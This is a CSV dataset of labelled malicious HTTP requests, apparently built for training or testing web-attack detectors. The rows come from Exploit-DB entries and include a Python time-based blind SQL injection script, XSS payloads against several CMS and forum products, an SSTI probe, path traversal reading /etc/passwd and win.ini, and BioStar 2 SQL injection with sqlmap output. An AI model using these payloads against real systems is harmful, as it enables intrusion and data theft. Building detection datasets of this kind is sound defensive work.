"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_luongvd_000039","1","exploitdb","https://www.exploit-db.com/exploits/51607","GET","https://X.X.X.X.12:2004/web/log/dynamic_log.php?target=makeMaintainLog&downloadtype='(select*from(select(sleep(10)))a)'","/web/log/dynamic_log.php","target=makeMaintainLog&downloadtype='(select*from(select(sleep(10)))a)'","[[""Host"", ""X.X.X.X.12:2004""], [""Accept-Encoding"", ""gzip, deflate""], [""Accept"", ""*/*""], [""Accept-Language"", ""en""], [""User-Agent"", ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36""], [""Connection"", ""close""]]","POC:
'''
import requests
import time

url = ""http://X.X.X.X:2004/web/log/dynamic_log.php""

# Function to check if the response time is greater than the specified delay
def is_response_time_delayed(response_time, delay):
    return response_time >= delay

# Function to perform blind SQL injection and check the response time
def perform_blind_sql_injection(payload):
    proxies = {
        'http': 'http://localhost:8080',
        'https': 'http://localhost:8080',
    }

    params = {
        'target': 'makeMaintainLog',
        'downloadtype': payload
    }
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
        'Connection': 'close'
    }

    start_time = time.time()
    response = requests.get(url, headers=headers, params=params,
proxies=proxies)
    end_time = time.time()

    response_time = end_time - start_time
    return is_response_time_delayed(response_time, 20)

# Enumerate the MySQL version
def enumerate_mysql_version():
    version_Name = ''
    sleep_time = 10  # Sleep time is 10 seconds

    payloads = [
        f""' AND (SELECT IF(ASCII(SUBSTRING(@@version, {i}, 1))={mid},
SLEEP({sleep_time}), 0))-- -""
        for i in range(1, 11)
        for mid in range(256)
    ]

    for payload in payloads:
        if perform_blind_sql_injection(payload):
            mid = payload.split(""="")[-1].split("","")[0]
            version_Name += chr(int(mid))

    return version_Name

# Enumeration is completed
version_Name = enumerate_mysql_version()
print(""MySQL version is:"", version_Name)","GET
/web/log/dynamic_log.php?target=makeMaintainLog&downloadtype='(select*from(select(sleep(10)))a)'
HTTP/1.1
Host: X.X.X.X.12:2004
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Connection: close

POC:
'''
import requests
import time

url = ""http://X.X.X.X:2004/web/log/dynamic_log.php""

# Function to check if the response time is greater than the specified delay
def is_response_time_delayed(response_time, delay):
    return response_time >= delay

# Function to perform blind SQL injection and check the response time
def perform_blind_sql_injection(payload):
    proxies = {
        'http': 'http://localhost:8080',
        'https': 'http://localhost:8080',
    }

    params = {
        'target': 'makeMaintainLog',
        'downloadtype': payload
    }
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
        'Connection': 'close'
    }

    start_time = time.time()
    response = requests.get(url, headers=headers, params=params,
proxies=proxies)
    end_time = time.time()

    response_time = end_time - start_time
    return is_response_time_delayed(response_time, 20)

# Enumerate the MySQL version
def enumerate_mysql_version():
    version_Name = ''
    sleep_time = 10  # Sleep time is 10 seconds

    payloads = [
        f""' AND (SELECT IF(ASCII(SUBSTRING(@@version, {i}, 1))={mid},
SLEEP({sleep_time}), 0))-- -""
        for i in range(1, 11)
        for mid in range(256)
    ]

    for payload in payloads:
        if perform_blind_sql_injection(payload):
            mid = payload.split(""="")[-1].split("","")[0]
            version_Name += chr(int(mid))

    return version_Name

# Enumeration is completed
version_Name = enumerate_mysql_version()
print(""MySQL version is:"", version_Name)","sqli"
"pos_luongvd_000040","1","exploitdb","https://www.exploit-db.com/exploits/51559","POST","/GZForumScript/preview.php?controller=Load&action=start_new_topic","/GZForumScript/preview.php","controller=Load&action=start_new_topic","[[""Content-Disposition"", ""form-data; name=\""free_name\""""]]","<script>alert(1)</script>
-----------------------------39829578812616571248381709325
Content-Disposition: form-data; name=""topic""

<script>alert(1)</script>
-----------------------------39829578812616571248381709325
Content-Disposition: form-data; name=""topic_message""

<script>alert(1)</script>
-----------------------------39829578812616571248381709325--

-----------------------------------------------

POST parameter 'free_name' is vulnerable to XSS
POST parameter 'topic' is vulnerable to XSS
POST parameter 'topic_message' is vulnerable to XSS


## Steps to Reproduce:

1. As a [Guest User] Click on [New Topic] to create a ""New Topic"" on this Path (http://website/preview.php?controller=Load&action=start_new_topic)
2. Inject your [XSS Payload] in ""Name""
3. Inject your [XSS Payload] in ""Topic Title ""
4. Inject your [XSS Payload] in ""Topic Message""
5. Submit

4. XSS Fired on Visitor Browser's when they Visit the Topic you Infect your [XSS Payload] on

5. XSS Fired on ADMIN Browser when he visit [Dashboard] in Administration Panel on this Path (https://website/GzAdmin/dashboard)
6. XSS Fired on ADMIN Browser when he visit [Topic] & [All Topics] to check [New Topics] on this Path (https://website/GzTopic/index)","POST /GZForumScript/preview.php?controller=Load&action=start_new_topic HTTP/1.1

-----------------------------39829578812616571248381709325
Content-Disposition: form-data; name=""free_name""

<script>alert(1)</script>
-----------------------------39829578812616571248381709325
Content-Disposition: form-data; name=""topic""

<script>alert(1)</script>
-----------------------------39829578812616571248381709325
Content-Disposition: form-data; name=""topic_message""

<script>alert(1)</script>
-----------------------------39829578812616571248381709325--

-----------------------------------------------

POST parameter 'free_name' is vulnerable to XSS
POST parameter 'topic' is vulnerable to XSS
POST parameter 'topic_message' is vulnerable to XSS


## Steps to Reproduce:

1. As a [Guest User] Click on [New Topic] to create a ""New Topic"" on this Path (http://website/preview.php?controller=Load&action=start_new_topic)
2. Inject your [XSS Payload] in ""Name""
3. Inject your [XSS Payload] in ""Topic Title ""
4. Inject your [XSS Payload] in ""Topic Message""
5. Submit

4. XSS Fired on Visitor Browser's when they Visit the Topic you Infect your [XSS Payload] on

5. XSS Fired on ADMIN Browser when he visit [Dashboard] in Administration Panel on this Path (https://website/GzAdmin/dashboard)
6. XSS Fired on ADMIN Browser when he visit [Topic] & [All Topics] to check [New Topics] on this Path (https://website/GzTopic/index)","xss"
"pos_luongvd_000041","1","exploitdb","https://www.exploit-db.com/exploits/51559","GET","http://www.website/preview.php?controller=Load&action=index&catid=moztj%22%3e%3cscript%3ealert","/preview.php","controller=Load&action=index&catid=moztj%22%3e%3cscript%3ealert","[]","","http://www.website/preview.php?controller=Load&action=index&catid=moztj%22%3e%3cscript%3ealert","xss"
"pos_luongvd_000042","1","exploitdb","https://www.exploit-db.com/exploits/51559","GET","http://www.website/preview.php?controller=Load&action=topic&topicid=1wgaff%22%3e%3cscript%3ealert","/preview.php","controller=Load&action=topic&topicid=1wgaff%22%3e%3cscript%3ealert","[]","","http://www.website/preview.php?controller=Load&action=topic&topicid=1wgaff%22%3e%3cscript%3ealert","xss"
"pos_luongvd_000043","1","exploitdb","https://www.exploit-db.com/exploits/51529","GET","https://demo.diafancms.com/shop/?module=shop&action=search&cat_id=0&a=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pr1=0&pr2=0","/shop/","module=shop&action=search&cat_id=0&a=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pr1=0&pr2=0","[]","","https://demo.diafancms.com/shop/?module=shop&action=search&cat_id=0&a=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pr1=0&pr2=0","xss"
"pos_luongvd_000044","1","exploitdb","https://www.exploit-db.com/exploits/51502","POST","https://demo.barebonescms.com/sessions/127.0.0.1/moors-sluses/admin/","/sessions/127.0.0.1/moors-sluses/admin/","","[[""Host"", ""demo.barebonescms.com""], [""Cookie"", ""PHPSESSID=81ecf7072ed639fa2fda1347883265a4""], [""User-Agent"", ""Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0""], [""Accept"", ""application/json, text/javascript, */*; q=0.01""], [""Accept-Language"", ""en-US,en;q=0.5""], [""Accept-Encoding"", ""gzip, deflate""], [""Content-Type"", ""application/x-www-form-urlencoded; charset=UTF-8""], [""X-Requested-With"", ""XMLHttpRequest""], [""Content-Length"", ""237""], [""Origin"", ""https://demo.barebonescms.com""], [""Dnt"", ""1""], [""Referer"", ""https://demo.barebonescms.com/sessions/78.163.184.240/moors-sluses/admin/?action=addeditasset&id=1&type=story&lang=en-us&sec_t=241bac393bb576b2538613a18de8c01184323540""], [""Sec-Fetch-Dest"", ""empty""], [""Sec-Fetch-Mode"", ""cors""], [""Sec-Fetch-Site"", ""same-origin""], [""Te"", ""trailers""], [""Connection"", ""close""]]","action=saveasset&id=1&revision=0&type=story&sec_t=a6adec1ffa60ca5adf4377df100719b952d3f596&lang=en-us&title=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&newtag=&publish_date=2023-06-03&publish_time=12%3A07+am&unpublish_date=&unpublish_time=","POST /sessions/127.0.0.1/moors-sluses/admin/ HTTP/1.1
Host: demo.barebonescms.com
Cookie: PHPSESSID=81ecf7072ed639fa2fda1347883265a4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 237
Origin: https://demo.barebonescms.com
Dnt: 1
Referer: https://demo.barebonescms.com/sessions/78.163.184.240/moors-sluses/admin/?action=addeditasset&id=1&type=story&lang=en-us&sec_t=241bac393bb576b2538613a18de8c01184323540
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

action=saveasset&id=1&revision=0&type=story&sec_t=a6adec1ffa60ca5adf4377df100719b952d3f596&lang=en-us&title=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&newtag=&publish_date=2023-06-03&publish_time=12%3A07+am&unpublish_date=&unpublish_time=","xss"
"pos_luongvd_000045","1","exploitdb","https://www.exploit-db.com/exploits/51499","GET","https://template189526.motopreview.com/store/category/search/?page=&limit=&keyword={{7*7}}","/store/category/search/","page=&limit=&keyword={{7*7}}","[[""Host"", ""template189526.motopreview.com""], [""Cookie"", ""PHPSESSID=7c0qgdvsehaf1a2do6s0bcl4p0; 9b7029e0bd3be0d41ebefd47d9f5ae46_session-started=1685536759239""], [""User-Agent"", ""Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0""], [""Accept"", ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8""], [""Accept-Language"", ""en-US,en;q=0.5""], [""Accept-Encoding"", ""gzip, deflate""], [""Dnt"", ""1""], [""Referer"", ""https://template189526.motopreview.com/store/category/search/?keyword=%7B%7B3*3%7D%7D""], [""Upgrade-Insecure-Requests"", ""1""], [""Sec-Fetch-Dest"", ""iframe""], [""Sec-Fetch-Mode"", ""navigate""], [""Sec-Fetch-Site"", ""same-origin""], [""Sec-Fetch-User"", ""?1""], [""Te"", ""trailers""], [""Connection"", ""close""]]","","GET /store/category/search/?page=&limit=&keyword={{7*7}} HTTP/1.1
Host: template189526.motopreview.com
Cookie: PHPSESSID=7c0qgdvsehaf1a2do6s0bcl4p0; 9b7029e0bd3be0d41ebefd47d9f5ae46_session-started=1685536759239
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://template189526.motopreview.com/store/category/search/?keyword=%7B%7B3*3%7D%7D
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close","ssti"
"pos_luongvd_000046","1","exploitdb","https://www.exploit-db.com/exploits/51499","GET","https://template189526.motopreview.com/store/category/search/?keyword=%7B%7B3*3%7D%7D","/store/category/search/","keyword=%7B%7B3*3%7D%7D","[]","","https://template189526.motopreview.com/store/category/search/?keyword=%7B%7B3*3%7D%7D","ssti"
"pos_luongvd_000047","1","exploitdb","https://www.exploit-db.com/exploits/51430","GET","https://192.168.X.X:10000/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini","/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini","","[[""Host"", ""192.168.X.X:10000""], [""Connection"", ""Keep-alive""], [""Accept-Encoding"", ""gzip,deflate""], [""User-Agent"", ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML,""], [""Accept"", ""*/*""]]","HTTP/1.1 200 OK
Host: 192.168.X.X:10000
Connection: close
Content-Type: application/octet-stream
Content-Length: 499

; for 16-bit app support [fonts] [extensions] [mci extensions] [files]
[Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CMCDLLNAME=mapi.dll CMC=1 MAPIX=1
MAPIXVER=1.0.0.1 OLEMessaging=1 [MCI Extensions.BAK] 3g2=MPEGVideo
3gp=MPEGVideo 3gp2=MPEGVideo 3gpp=MPEGVideo aac=MPEGVideo adt=MPEGVideo
adts=MPEGVideo m2t=MPEGVideo m2ts=MPEGVideo m2v=MPEGVideo m4a=MPEGVideo
m4v=MPEGVideo mod=MPEGVideo mov=MPEGVideo mp4=MPEGVideo mp4v=MPEGVideo
mts=MPEGVideo ts=MPEGVideo tts=MPEGVideo","GET /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
HTTP/1.1
Host: 192.168.X.X:10000
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML,
like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

HTTP/1.1 200 OK
Host: 192.168.X.X:10000
Connection: close
Content-Type: application/octet-stream
Content-Length: 499

; for 16-bit app support [fonts] [extensions] [mci extensions] [files]
[Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CMCDLLNAME=mapi.dll CMC=1 MAPIX=1
MAPIXVER=1.0.0.1 OLEMessaging=1 [MCI Extensions.BAK] 3g2=MPEGVideo
3gp=MPEGVideo 3gp2=MPEGVideo 3gpp=MPEGVideo aac=MPEGVideo adt=MPEGVideo
adts=MPEGVideo m2t=MPEGVideo m2ts=MPEGVideo m2v=MPEGVideo m4a=MPEGVideo
m4v=MPEGVideo mod=MPEGVideo mov=MPEGVideo mp4=MPEGVideo mp4v=MPEGVideo
mts=MPEGVideo ts=MPEGVideo tts=MPEGVideo","lfi"
"pos_luongvd_000048","1","exploitdb","https://www.exploit-db.com/exploits/51381","GET","http://192.168.0.32/cmsgdidees3.9.1-mysqli/_admin/imgdownload.php?filename=../../../../../etc/passwd","/cmsgdidees3.9.1-mysqli/_admin/imgdownload.php","filename=../../../../../etc/passwd","[]","","http://192.168.0.32/cmsgdidees3.9.1-mysqli/_admin/imgdownload.php?filename=../../../../../etc/passwd","lfi"
"pos_luongvd_000049","1","exploitdb","https://www.exploit-db.com/exploits/51340","POST","https://biostar2.server.net/api/users/absence?search_month=1","/api/users/absence","search_month=1","[[""Host"", ""biostar2.server.net""], [""User-Agent"", ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0""], [""Accept"", ""application/json, text/plain, */*""], [""Accept-Language"", ""en-GB,en;q=0.5""], [""Accept-Encoding"", ""gzip, deflate""], [""content-type"", ""application/json;charset=UTF-8""], [""content-language"", ""en""], [""bs-session-id"", ""207c1c3c3b624fcc85b7f0814c4bf548""], [""Content-Length"", ""204""], [""Origin"", ""https://biostar2.server.net""], [""Connection"", ""close""], [""Referer"", ""https://biostar2.server.net/""], [""Sec-Fetch-Dest"", ""empty""], [""Sec-Fetch-Mode"", ""cors""], [""Sec-Fetch-Site"", ""same-origin""]]","{""Query"":{""offset"":0,""limit"":51,""atLeastOneFilterExists"":true,""conditions"":[{""column"":""user_group_id.id"",""operator"":2,""values"":[""(select*from(select(sleep(4)))a)"",4840,20120]}],""orders"":[],""total"":false}}

'''

Time based SQL injection (set 4 – response delays for 8 seconds).

'''

## Request PoC #2
'''","POST /api/users/absence?search_month=1 HTTP/1.1
Host: biostar2.server.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json;charset=UTF-8
content-language: en
bs-session-id: 207c1c3c3b624fcc85b7f0814c4bf548
Content-Length: 204
Origin: https://biostar2.server.net
Connection: close
Referer: https://biostar2.server.net/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{""Query"":{""offset"":0,""limit"":51,""atLeastOneFilterExists"":true,""conditions"":[{""column"":""user_group_id.id"",""operator"":2,""values"":[""(select*from(select(sleep(4)))a)"",4840,20120]}],""orders"":[],""total"":false}}

'''

Time based SQL injection (set 4 – response delays for 8 seconds).

'''

## Request PoC #2
'''","sqli"
"pos_luongvd_000050","1","exploitdb","https://www.exploit-db.com/exploits/51340","POST","https://biostar2.server.net/api/users/absence?search_month=1","/api/users/absence","search_month=1","[[""Host"", ""biostar2.server.net""], [""User-Agent"", ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0""], [""Accept"", ""application/json, text/plain, */*""], [""Accept-Language"", ""en-GB,en;q=0.5""], [""Accept-Encoding"", ""gzip, deflate""], [""content-type"", ""application/json;charset=UTF-8""], [""content-language"", ""en""], [""bs-session-id"", ""207c1c3c3b624fcc85b7f0814c4bf548""], [""Content-Length"", ""188""], [""Origin"", ""https://biostar2.server.net""], [""Connection"", ""close""], [""Referer"", ""https://biostar2.server.net/""], [""Sec-Fetch-Dest"", ""empty""], [""Sec-Fetch-Mode"", ""cors""], [""Sec-Fetch-Site"", ""same-origin""]]","{""Query"":{""offset"":0,""limit"":51,""atLeastOneFilterExists"":true,""conditions"":[{""column"":""user_group_id.id"",""operator"":2,""values"":[""1 and 3523=03523"",4840,20120]}],""orders"":[],""total"":false}}

'''

Boolean-based SQL injection (payload “1 and 3523=03523” means “1 and True”, so we can see information in response, regarding user with id 1, which is admin)

'''

## Exploit with SQLmap

Save the request from Burp Suite to file.

'''
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {""Query"":{""offset"":0,""limit"":51,""atLeastOneFilterExists"":true,""conditions"":[{""column"":""user_group_id.id"",""operator"":2,""values"":[""1 and 3523=03523"",4840,20120]}],""orders"":[],""total"":false}}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {""Query"":{""offset"":0,""limit"":51,""atLeastOneFilterExists"":true,""conditions"":[{""column"":""user_group_id.id"",""operator"":2,""values"":[""(select*from(select(sleep(7)))a)"",4840,20120]}],""orders"":[],""total"":false}}
---
[05:02:49] [INFO] testing MySQL
[05:02:49] [INFO] confirming MySQL
[05:02:50] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL > 5.0.0 (MariaDB fork)
[05:02:50] [INFO] fetching database names
[05:02:50] [INFO] fetching number of databases
[05:02:54] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[05:02:55] [INFO] retrieved: 2
[05:03:12] [INFO] retrieved: biostar2_ac
[05:03:56] [INFO] retrieved: information_schema
available databases [2]:
[*] biostar2_ac
[*] information schema

'''","POST /api/users/absence?search_month=1 HTTP/1.1
Host: biostar2.server.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json;charset=UTF-8
content-language: en
bs-session-id: 207c1c3c3b624fcc85b7f0814c4bf548
Content-Length: 188
Origin: https://biostar2.server.net
Connection: close
Referer: https://biostar2.server.net/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{""Query"":{""offset"":0,""limit"":51,""atLeastOneFilterExists"":true,""conditions"":[{""column"":""user_group_id.id"",""operator"":2,""values"":[""1 and 3523=03523"",4840,20120]}],""orders"":[],""total"":false}}

'''

Boolean-based SQL injection (payload “1 and 3523=03523” means “1 and True”, so we can see information in response, regarding user with id 1, which is admin)

'''

## Exploit with SQLmap

Save the request from Burp Suite to file.

'''
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {""Query"":{""offset"":0,""limit"":51,""atLeastOneFilterExists"":true,""conditions"":[{""column"":""user_group_id.id"",""operator"":2,""values"":[""1 and 3523=03523"",4840,20120]}],""orders"":[],""total"":false}}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {""Query"":{""offset"":0,""limit"":51,""atLeastOneFilterExists"":true,""conditions"":[{""column"":""user_group_id.id"",""operator"":2,""values"":[""(select*from(select(sleep(7)))a)"",4840,20120]}],""orders"":[],""total"":false}}
---
[05:02:49] [INFO] testing MySQL
[05:02:49] [INFO] confirming MySQL
[05:02:50] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL > 5.0.0 (MariaDB fork)
[05:02:50] [INFO] fetching database names
[05:02:50] [INFO] fetching number of databases
[05:02:54] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[05:02:55] [INFO] retrieved: 2
[05:03:12] [INFO] retrieved: biostar2_ac
[05:03:56] [INFO] retrieved: information_schema
available databases [2]:
[*] biostar2_ac
[*] information schema

'''","sqli"
